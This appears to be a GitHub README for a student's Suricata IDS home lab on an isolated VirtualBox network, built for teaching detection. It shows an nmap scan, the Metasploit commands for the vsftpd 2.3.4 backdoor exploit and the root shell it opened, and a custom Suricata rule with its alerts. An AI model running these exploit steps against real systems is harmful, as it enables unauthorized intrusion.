# 🛡️ Suricata IDS Home Lab

A hands-on cybersecurity home lab built to simulate real-world network attacks and detect them using Suricata IDS. This project demonstrates end-to-end attack simulation and intrusion detection in an isolated virtual environment.

---

## 🖥️ Lab Architecture

```
┌─────────────────┐         ┌─────────────────┐         ┌──────────────────────┐
│   Kali Linux    │ ──────► │  Metasploitable2 │         │    Suricata IDS      │
│   (Attacker)    │         │    (Victim)      │ ◄────── │  (Network Monitor)   │
│ 192.168.56.102  │         │ 192.168.56.101   │         │   Active (Running)   │
└─────────────────┘         └─────────────────┘         └──────────────────────┘
         │                          │                              │
         └──────────────────────────┴──────────────────────────────┘
                            Host-Only Network (VirtualBox)
                               192.168.56.0/24
```

---

## ⚙️ Tools & Technologies

| Tool | Version | Purpose |
|------|---------|---------|
| VirtualBox | 7.x | Virtualization Platform |
| Kali Linux | Latest | Attacker Machine |
| Metasploitable 2 | 2.0 | Vulnerable Target |
| Suricata IDS | 8.0.4 | Intrusion Detection System |
| Metasploit Framework | 6.4.99 | Exploitation Framework |
| Nmap | Latest | Network Scanner |

---

## 🔧 Lab Setup

### Prerequisites
- VirtualBox installed on host machine
- Minimum 8GB RAM
- 50GB free disk space

### Step 1: Network Configuration
All VMs connected via **Host-Only Adapter** (VirtualBox):
- Adapter: `VirtualBox Host-Only Ethernet Adapter`
- Promiscuous Mode: `Allow All`
- Network Range: `192.168.56.0/24`

### Step 2: Suricata Installation & Configuration
```bash
# Install Suricata
sudo apt install suricata -y

# Edit config
sudo nano /etc/suricata/suricata.yaml

# Set interface
af-packet:
  - interface: eth0

# Add custom rules
sudo nano /etc/suricata/rules/local.rules
```

### Step 3: Custom Rules Added
```
alert tcp any any -> 192.168.56.101 21 (msg:"FTP Backdoor Attack Detected"; content:"USER"; sid:1000001; rev:1;)
```

### Step 4: Start Suricata
```bash
sudo systemctl start suricata
sudo systemctl status suricata
```

---

## ⚔️ Attacks Performed

### 1. 🔍 Nmap Service Scan (Reconnaissance)
```bash
nmap -sV 192.168.56.101
```

**Result — 20+ Open Ports Found:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 23/tcp | Telnet | Linux telnetd |
| 80/tcp | HTTP | Apache httpd 2.2.8 |
| 139/445/tcp | Samba | smbd 3.x |
| 3306/tcp | MySQL | 5.0.51a |
| 5432/tcp | PostgreSQL | 8.3.0 |
| 1524/tcp | Bindshell | Metasploitable root shell |

---

### 2. 💥 vsftpd 2.3.4 Backdoor Exploit

**Vulnerability:** vsftpd 2.3.4 contains a backdoor that opens a shell on port 6200 when triggered.

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

**Result:**
```
[+] 192.168.56.101:21 - Backdoor service has been spawned
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
    192.168.56.102:45763 → 192.168.56.101:6200
```
✅ **ROOT access achieved on target machine!**

---

## 🛡️ Detection Results

### Suricata Alerts Generated

```bash
sudo tail -f /var/log/suricata/fast.log
```

**Alerts captured in fast.log:**
```
03/29/2026-20:51:22  [**] [1:1000001:1] FTP Backdoor Attack Detected [**]
[Classification: (null)] [Priority: 3] {TCP}
192.168.56.102:40409 → 192.168.56.101:21

[**] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**]
[Classification: Potential Corporate Privacy Violation] [Priority: 1]
192.168.56.102:68 → 192.168.56.100:67
```

✅ **Suricata successfully detected:**
- FTP Backdoor attack via custom rule (sid:1000001)
- Kali Linux presence on the network via ET POLICY rule

---

## 📊 Key Learnings

- How attackers perform **reconnaissance** using Nmap to find vulnerable services
- How **backdoor exploits** work in real network environments
- How to write **custom Suricata rules** for specific attack detection
- How **IDS systems** monitor and alert on malicious traffic in real-time
- Difference between **offensive security** (Metasploit) and **defensive security** (Suricata)

---

## 📁 Repository Structure

```
Suricata-IDS-Home-Lab/
│
├── README.md               # Project documentation
├── local.rules             # Custom Suricata detection rules
├── setup-guide.md          # Step-by-step lab setup guide
└── screenshots/
    ├── nmap-scan.png        # Nmap service scan results
    ├── metasploit-shell.png # ROOT shell via Metasploit
    └── suricata-alert.png   # Suricata FTP alert in fast.log
```

---

## 🚀 Future Work

- [ ] Add Nmap Stealth Scan detection rules
- [ ] Add SSH Brute Force detection rules  
- [ ] Integrate with Splunk SIEM for log analysis
- [ ] Add DVWA (Damn Vulnerable Web App) for web attack simulation
- [ ] Document more CVE exploits and their detection

---

## ⚠️ Disclaimer

This project is built **strictly for educational purposes** in an isolated virtual environment. All attacks were performed on intentionally vulnerable machines in a controlled lab. Never attempt these techniques on systems you do not own or have explicit permission to test.

---

## 👤 Author

**Umang Srivastava**  
Cybersecurity Graduate | BCA (Cyber Security & Forensics) — Parul University  
🔗 [LinkedIn](https://linkedin.com/in/umangsrivastava220) | 🐙 [GitHub](https://github.com/umang220)

---

⭐ **If you found this project helpful, please give it a star!**
